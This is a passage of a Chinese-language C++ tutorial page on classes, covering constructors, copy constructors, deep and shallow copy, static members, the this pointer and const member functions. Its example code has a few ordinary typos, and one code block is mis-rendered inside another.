class="hljs-comment">//析构函数</span><br>&#123;<br>cout&lt;&lt;<span class="hljs-string">&quot;person析构函数被调用&quot;</span>&lt;&lt;endl;<br>&#125;<br><span class="hljs-type">int</span> a;<br>&#125;;<br></code></pre></td></tr></table></figure><p>调用方式：</p><ul><li>括号法<ul><li>注意事项<ul><li>调用默认构造函数时不要加()，<code>person p1()</code>会被当做是一个函数的声明</li></ul></li></ul></li><li>显示法<ul><li>不要利用拷贝构造函数初始化匿名对象</li></ul></li><li>隐式转换法</li></ul><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">test01</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>     <span class="hljs-comment">//括号法</span><br>     person p;<span class="hljs-comment">//默认构造函数调用</span><br>     <span class="hljs-function">person <span class="hljs-title">p1</span><span class="hljs-params">(<span class="hljs-number">10</span>)</span></span>;<span class="hljs-comment">//括号法调用有参</span><br>     <span class="hljs-function">person <span class="hljs-title">p2</span><span class="hljs-params">(p1)</span></span>;<span class="hljs-comment">//括号法调用拷贝</span><br>     <span class="hljs-comment">//显示法</span><br>     person p3=<span class="hljs-built_in">person</span>(<span class="hljs-number">10</span>);<span class="hljs-comment">//显示法调用有参构造</span><br>     person p4=<span class="hljs-built_in">person</span>(p1);<span class="hljs-comment">//显示法调用拷贝构造</span><br>     <span class="hljs-built_in">person</span>(<span class="hljs-number">10</span>);<span class="hljs-comment">//匿名对象，当前执行结束后会立即释放掉</span><br>     <span class="hljs-comment">//隐式转换法</span><br>     person p5=<span class="hljs-number">10</span>;<span class="hljs-comment">//相当于person p5=person(10)</span><br>&#125;<br></code></pre></td></tr></table></figure><h3 id="拷贝构造函数调用时机"><a href="#拷贝构造函数调用时机" class="headerlink" title="拷贝构造函数调用时机"></a>拷贝构造函数调用时机</h3><p>调用的三种情况</p><ul><li>调用一个已经创建完毕的对象来初始化新对象</li><li>值传递方式给函数参数传值</li><li>以值传递方式返回局部对象</li></ul><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">person</span><br>&#123;<br><span class="hljs-keyword">public</span>:<br><span class="hljs-built_in">person</span>()<br>&#123;<br>cout&lt;&lt;<span class="hljs-string">&quot;默认构造函数被调用&quot;</span>&lt;&lt;endl;<br>&#125;<br><span class="hljs-built_in">person</span>(<span class="hljs-type">int</span> a)<br>&#123;<br>age=a;<br>cout&lt;&lt;<span class="hljs-string">&quot;有参构造被调用&quot;</span>&lt;&lt;endl;<br>&#125;<br>~<span class="hljs-built_in">person</span>()<br>&#123;<br>cout&lt;&lt;<span class="hljs-string">&quot;析构函数被调用&quot;</span>&lt;&lt;endl;<br>&#125;<br><span class="hljs-built_in">person</span>(<span class="hljs-type">const</span> person &amp;p)<br>&#123;<br>age=p.age;<br>cout&lt;&lt;<span class="hljs-string">&quot;拷贝构造被调用&quot;</span>&lt;&lt;endl<br>&#125;<br>&#125;;<br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">work1</span><span class="hljs-params">(person p)</span></span><br><span class="hljs-function"></span>&#123;<br>     <br>&#125;<br><span class="hljs-function">person <span class="hljs-title">work2</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>     person p1;<br>     <span class="hljs-keyword">return</span> p1;<br>&#125;<br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>     <span class="hljs-function">person <span class="hljs-title">p1</span><span class="hljs-params">(<span class="hljs-number">20</span>)</span></span>;<br>     <span class="hljs-function">person <span class="hljs-title">p2</span><span class="hljs-params">(p1)</span></span>;<span class="hljs-comment">//第一种调用情况</span><br>     <span class="hljs-built_in">work1</span>(p1);<span class="hljs-comment">//第二种调用情况，拷贝出临时的副本给函数用</span><br>     person p=<span class="hljs-built_in">work2</span>();<span class="hljs-comment">//第三种调用情况，return时会拷贝一个新对象给p</span><br>     <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="构造函数调用规则"><a href="#构造函数调用规则" class="headerlink" title="构造函数调用规则"></a>构造函数调用规则</h3><p>默认情况下，c++编译器至少给一个类添加三个函数</p><ul><li>默认构造函数（无参，函数体为空）</li><li>默认析构函数（无参，函数体为空）</li><li>默认拷贝函数，对属性进行值拷贝</li></ul><p>构造函数调用规则：</p><ul><li>用户自定义<strong>有参构造</strong>函数，C++不在提供默认无参构造，但是会提供默认拷贝函数</li><li>用户自定义<strong>拷贝构造</strong>函数，C++不再提供其他的构造函数</li></ul><h3 id="深拷贝和浅拷贝"><a href="#深拷贝和浅拷贝" class="headerlink" title="深拷贝和浅拷贝"></a>深拷贝和浅拷贝</h3><p>浅拷贝：简单赋值操作</p><p>深拷贝：在堆区重新申请空间，进行拷贝操作</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">person</span><br>&#123;<br><span class="hljs-keyword">public</span>:<br><span class="hljs-built_in">person</span>()<br>&#123;<br>cout&lt;&lt;<span class="hljs-string">&quot;默认构造函数被调用&quot;</span>&lt;&lt;endl;<br>&#125;<br><span class="hljs-built_in">person</span>(<span class="hljs-type">int</span> a,<span class="hljs-type">int</span> h)<br>&#123;<br>age=a;<br>          high=<span class="hljs-keyword">new</span> <span class="hljs-built_in">int</span>(h);<br>cout&lt;&lt;<span class="hljs-string">&quot;有参构造被调用&quot;</span>&lt;&lt;endl;<br>&#125;<br>~<span class="hljs-built_in">person</span>()<br>&#123;<br>          <span class="hljs-comment">//析构函数，将堆区开辟的数据释放掉</span><br>          <span class="hljs-keyword">if</span> (high!=<span class="hljs-literal">NULL</span>)<br>               <span class="hljs-keyword">delete</span> high;<br>cout&lt;&lt;<span class="hljs-string">&quot;析构函数被调用&quot;</span>&lt;&lt;endl;<br>&#125;<br><span class="hljs-keyword">private</span>:<br>     <span class="hljs-type">int</span> age;<br>     <span class="hljs-type">int</span>* high=<span class="hljs-literal">NULL</span>;<br>&#125;;<br></code></pre></td></tr></table></figure><p>浅拷贝会导致一块内存重复被释放</p><ul><li><pre><code class="c++">int main()&#123;    person p1(18,120);    person p2(p1);//系统提供的拷贝函数，是浅拷贝    return 0;&#125;//此时p1p2中的age存储的是同一块堆中的地址，当p2结束后会执行一次析构函数，此时high已经被释放掉，而p1结束后还会再来一次析构函数，而此时已经释放掉的内存就会再一次被释放，导致程序出错<figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs gradle"><br>此时就需要深拷贝，需要重新申请一块内存<br><br>```c++<br><span class="hljs-keyword">class</span> person<br>&#123;<br><span class="hljs-keyword">public</span>:<br>person()<br>&#123;<br>cout&lt;&lt;<span class="hljs-string">&quot;默认构造函数被调用&quot;</span>&lt;&lt;endl;<br>&#125;<br>person(<span class="hljs-keyword">int</span> a,<span class="hljs-keyword">int</span> h)<br>&#123;<br>age=a;<br>          high=<span class="hljs-keyword">new</span> <span class="hljs-keyword">int</span>(h);<br>cout&lt;&lt;<span class="hljs-string">&quot;有参构造被调用&quot;</span>&lt;&lt;endl;<br>&#125;<br>~person()<br>&#123;<br>          <span class="hljs-comment">//析构函数，将堆区开辟的数据释放掉</span><br>          <span class="hljs-keyword">if</span> (high!=<span class="hljs-keyword">NULL</span>)<br>               <span class="hljs-keyword">delete</span> high;<br>cout&lt;&lt;<span class="hljs-string">&quot;析构函数被调用&quot;</span>&lt;&lt;endl;<br>&#125;<br>     <span class="hljs-comment">//深拷贝</span><br>     person(const person &amp;p)<br>     &#123;<br>          cout&lt;&lt;<span class="hljs-string">&quot;深拷贝函数被调用&quot;</span>&lt;&lt;endl;<br>          age=p.age;<br>          <span class="hljs-comment">//high=p.high;  编译器默认提供的拷贝函数就是这句代码</span><br>          high=<span class="hljs-keyword">new</span> <span class="hljs-keyword">int</span>(*p.high);<br>     &#125;<br><span class="hljs-keyword">private</span>:<br>     <span class="hljs-keyword">int</span> age;<br>     <span class="hljs-keyword">int</span>* high=<span class="hljs-keyword">NULL</span>;<br>&#125;;<br></code></pre></td></tr></table></figure></code></pre></li></ul><h3 id="初始化列表"><a href="#初始化列表" class="headerlink" title="初始化列表"></a>初始化列表</h3><p><strong>作用</strong>：</p><p>C++提供初始化列表语法，用于初始化属性</p><p>语法：<code>构造函数():属性1(值1),属性2(值2)....&#123;&#125;</code></p><p>参数非常数时：<code>person(int a,int b,int c):m_A(a),m_B(b),m_C(c)&#123;&#125;</code></p><h3 id="类对象作为类成员"><a href="#类对象作为类成员" class="headerlink" title="类对象作为类成员"></a>类对象作为类成员</h3><p>C++中类中的成员可以是另一个类的对象，我们称该成员为：<strong>对象成员</strong></p><p>比如</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">A</span>&#123;<br>&#125;;<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">B</span><br>&#123;<br>A a;<br>&#125;;<br></code></pre></td></tr></table></figure><p>B中有对象A作为成员，A是对象成员</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">phone</span><br>&#123;<br><span class="hljs-keyword">public</span>:<br><span class="hljs-built_in">phone</span>(string p)<br>&#123;<br>pname=p;<br>&#125;<br>string pname;<br>&#125;<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">person</span><br>&#123;<br><span class="hljs-keyword">public</span>:<br><span class="hljs-built_in">person</span>(string n,string pn)<br>&#123;<br>name=n;<br>m_phone.pname=pn;<br>&#125;<br>srring name;<br>phone m_phone;<br>&#125;<br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">test01</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-function">person <span class="hljs-title">p</span><span class="hljs-params">(<span class="hljs-string">&quot;pp&quot;</span>,<span class="hljs-string">&quot;apple&quot;</span>)</span></span>;<br><br>&#125;<br></code></pre></td></tr></table></figure><p>结论：当其他类对象作为本类对象，<strong>其他类的构造函数先被调用，然后自身的构造函数再来，析构则是反过来</strong></p><h3 id="静态成员"><a href="#静态成员" class="headerlink" title="静态成员"></a>静态成员</h3><p>在成员变量和成员函数前加static，称为静态成员</p><p>静态成员分为</p><h4 id="静态成员变量"><a href="#静态成员变量" class="headerlink" title="静态成员变量"></a>静态成员变量</h4><ul><li>所有对象共用一份数据</li><li>编译阶段分配内存</li><li>类内声明，类外初始化</li></ul><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">person</span><br>&#123;<br><span class="hljs-keyword">public</span>:<br><span class="hljs-type">static</span> <span class="hljs-type">int</span> a;<br>&#125;;<br><span class="hljs-type">int</span> person::a=<span class="hljs-number">100</span>;<span class="hljs-comment">//类外初始化</span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">test01</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>     person p;<br>     cout&lt;&lt;p.a&lt;&lt;endl;<br>     person p1;<br>     p<span class="hljs-number">1.</span>a=<span class="hljs-number">200</span>;<br>     cout&lt;&lt;p.a&lt;&lt;endl;<br>&#125;<br><span class="hljs-comment">//输出：</span><br><span class="hljs-comment">//100</span><br><span class="hljs-comment">//200</span><br></code></pre></td></tr></table></figure><p>静态成员变量不属于某个对象上，所有对象共享同一份数据</p><p>因此有两种访问方式</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">test02</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>person p;<br><span class="hljs-comment">//通过对象访问</span><br>cout&lt;&lt;p.a&lt;&lt;endl;<br><span class="hljs-comment">//通过类名访问</span><br>cout&lt;&lt;person::a&lt;&lt;endl;<br>&#125;<br></code></pre></td></tr></table></figure><p>静态成员变量同样存在访问权限</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">person</span><br>&#123;<br><span class="hljs-keyword">public</span>:<br><span class="hljs-type">static</span> <span class="hljs-type">int</span> a;<br><span class="hljs-keyword">private</span>:<br><span class="hljs-type">static</span> <span class="hljs-type">int</span> b;<br>&#125;;<br><span class="hljs-type">int</span> person::a=<span class="hljs-number">100</span>;<span class="hljs-comment">//类外初始化</span><br><span class="hljs-type">int</span> person::b=<span class="hljs-number">101</span>;<br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">test01</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>     person p;<br>     cout&lt;&lt;p.a&lt;&lt;endl;<br>     person p1;<br>     p<span class="hljs-number">1.</span>a=<span class="hljs-number">200</span>;<br>     cout&lt;&lt;p.a&lt;&lt;endl;<br>&#125;<br><span class="hljs-comment">//输出：</span><br><span class="hljs-comment">//100</span><br><span class="hljs-comment">//200</span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">test02</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>cout&lt;&lt;person::b&lt;&lt;endl;<span class="hljs-comment">//会报错，由于private权限，类外不可访问</span><br>&#125;<br></code></pre></td></tr></table></figure><h4 id="静态成员函数"><a href="#静态成员函数" class="headerlink" title="静态成员函数"></a>静态成员函数</h4><ul><li>所有对象共享同一个函数</li><li>静态成员函数只能访问静态成员变量（因为无法区分这个变量是谁的）</li></ul><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">person</span><br>&#123;<br><span class="hljs-keyword">public</span>:<br><span class="hljs-function"><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title">func</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>cout&lt;&lt;<span class="hljs-string">&quot;静态成员函数被调用&quot;</span>&lt;&lt;endl;<br>&#125;<br>&#125;;<br></code></pre></td></tr></table></figure><p>访问方式：</p><ul><li>通过对象访问</li><li>通过类名访问</li></ul><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">test01</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>person p;<br><span class="hljs-comment">//通过对象访问</span><br>p.<span class="hljs-built_in">func</span>();<br><span class="hljs-comment">//通过类名访问</span><br>person::<span class="hljs-built_in">func</span>();<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="c-对象模型和this指针"><a href="#c-对象模型和this指针" class="headerlink" title="c++对象模型和this指针"></a>c++对象模型和this指针</h2><h3 id="成员变量和成员函数分开存储"><a href="#成员变量和成员函数分开存储" class="headerlink" title="成员变量和成员函数分开存储"></a>成员变量和成员函数分开存储</h3><p>C++中，类内的成员变量和成员函数分开存储</p><p>只有<strong>非静态成员变量</strong>才属于类的对象上。静态成员变量、非静态成员函数、静态成员函数都不属于类的对象上</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">person</span><br>&#123;<br><br>&#125;;<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">person1</span><br>&#123;<br>     <span class="hljs-type">int</span> a;<br>&#125;;<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">person2</span><br>&#123;<br>     <span class="hljs-type">int</span> a;<br>     <span class="hljs-type">static</span> <span class="hljs-type">int</span> b;<br>&#125;;<br><span class="hljs-type">int</span> person2::b=<span class="hljs-number">100</span>;<br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">test01</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>person p;<br>cout&lt;&lt;<span class="hljs-string">&quot;size of p = &quot;</span>&lt;&lt;<span class="hljs-built_in">sizeof</span>(p)&lt;&lt;endl;<span class="hljs-comment">//输出结果是1，所以空对象占用内存是1</span><br>     <span class="hljs-comment">//c++会给每个空对象也分配一个字节，为了区别空对象占内存的位置，空对象也有独一无二的内存地址</span><br>&#125;<br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">test02</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>     person1 p;<br>cout&lt;&lt;<span class="hljs-string">&quot;size of p = &quot;</span>&lt;&lt;<span class="hljs-built_in">sizeof</span>(p)&lt;&lt;endl;<span class="hljs-comment">//结果是4</span><br>&#125;<br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">test03</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>     person2 p;<br>cout&lt;&lt;<span class="hljs-string">&quot;size of p = &quot;</span>&lt;&lt;<span class="hljs-built_in">sizeof</span>(p)&lt;&lt;endl;<span class="hljs-comment">//结果是还是4，它没有存储在类中</span><br>&#125;<br></code></pre></td></tr></table></figure><h3 id="this指针"><a href="#this指针" class="headerlink" title="this指针"></a>this指针</h3><p>C++通过提供特殊的对象指针，this指针，来区分是哪个对象调用的。<strong>this指针指向被调用的成员函数所属的对象</strong></p><ul><li>this指针隐含在每一个非静态成员函数内的一种指针</li><li>this指针不需要定义，可以直接使用</li></ul><p>用途</p><ul><li>当形参和成员函数重名时，用this指针来区分</li><li>在非静态成员函数中返回对象本身，可以使用<code>return *this</code></li></ul><p>实例</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">person</span><br>&#123;<br><span class="hljs-keyword">public</span>:<br><span class="hljs-built_in">person</span>(<span class="hljs-type">int</span> age)<br>&#123;<br><span class="hljs-keyword">this</span>-&gt;age=age;<br><span class="hljs-comment">//不能直接age=age，会报错</span><br>&#125;<br>     <span class="hljs-function">person&amp; <span class="hljs-title">addage</span><span class="hljs-params">(person&amp; p)</span><span class="hljs-comment">//要是引用，如果是person，返回的话就是浅拷贝创建了一个新对象，不再是原本的那个</span></span><br><span class="hljs-function">     </span>&#123;<br>          <span class="hljs-keyword">this</span>-&gt;age+=p.age;<br>          <span class="hljs-keyword">return</span> *<span class="hljs-keyword">this</span>;<span class="hljs-comment">//这样就可以重复调用</span><br>     &#125;<br><span class="hljs-type">int</span> age;<br>&#125;<br><span class="hljs-comment">//解决名称冲突</span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">test01</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>     <span class="hljs-function">person <span class="hljs-title">p1</span><span class="hljs-params">(<span class="hljs-number">18</span>)</span></span>;<br>     cout&lt;&lt;<span class="hljs-string">&quot;p1年龄：&quot;</span>&lt;&lt;endl;<span class="hljs-comment">//此时this指向p1;</span><br>&#125;<br><span class="hljs-comment">//返回对象本身用*this</span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">test02</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>     <span class="hljs-function">person <span class="hljs-title">p1</span><span class="hljs-params">(<span class="hljs-number">10</span>)</span></span>;<br>     <span class="hljs-function">person <span class="hljs-title">p2</span><span class="hljs-params">(<span class="hljs-number">10</span>)</span></span>;<br>     p<span class="hljs-number">2.</span><span class="hljs-built_in">addage</span>(p1).<span class="hljs-built_in">addage</span>(p1),<span class="hljs-built_in">addage</span>(p1);<span class="hljs-comment">//如果没有return *this就会报错</span><br>     <span class="hljs-comment">//链式编程思想</span><br>     cout&lt;&lt;<span class="hljs-string">&quot;p2年龄为：&quot;</span>&lt;&lt;p<span class="hljs-number">2.</span>age&lt;&lt;endl;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="空指针访问成员函数"><a href="#空指针访问成员函数" class="headerlink" title="空指针访问成员函数"></a>空指针访问成员函数</h3><p>C++中空指针也可以调用成员函数的，但要注意有没有用到this指针</p><p>如果遇到this指针要加以判断保证代码健壮性</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">person</span><br>&#123;<br><span class="hljs-keyword">public</span>:<br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">showtype</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>cout&lt;&lt;<span class="hljs-string">&quot;This is person class&quot;</span>&lt;&lt;endl;<br>&#125;<br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">showage</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>          <span class="hljs-keyword">if</span> (<span class="hljs-keyword">this</span>==<span class="hljs-literal">NULL</span>)<br>               <span class="hljs-keyword">return</span>;<span class="hljs-comment">//检查保证程序不会崩溃</span><br>cout&lt;&lt;age&lt;&lt;endl;<br>&#125;<br><span class="hljs-keyword">private</span>:<br><span class="hljs-type">int</span> age;<br>&#125;；<br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">test01</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>preson *p=<span class="hljs-literal">NULL</span>;<br>p-&gt;<span class="hljs-built_in">showtype</span>();<span class="hljs-comment">//这句不会</span><br>p-&gt;<span class="hljs-built_in">showage</span>();<span class="hljs-comment">//这句会出错，报错原因在于传入指针为空，age相当于this-&gt;age，而this指针是空</span><br>&#125;<br></code></pre></td></tr></table></figure><h3 id="const修饰成员函数"><a href="#const修饰成员函数" class="headerlink" title="const修饰成员函数"></a>const修饰成员函数</h3><ul><li>常函数<ul><li>加const后称为常函数</li><li>常函数内不可修改成员属性</li><li><strong>成员属性后加mutable后，在常函数内可以修改</strong></li></ul></li><li>常对象<ul><li>声明对象前加const后称为常函数</li><li>常对象只能调用常函数</li></ul></li></ul><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">person</span><br>&#123;<br><span class="hljs-keyword">private</span>:<br><span class="hljs-type">int</span> a;<br><span class="hljs-keyword">public</span>:<br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">showperson</span> <span class="hljs-params">()</span> <span class="hljs-type">const</span></span><br><span class="hljs-function"></span>&#123;<br>a = <span class="hljs-number">100</span>;<span 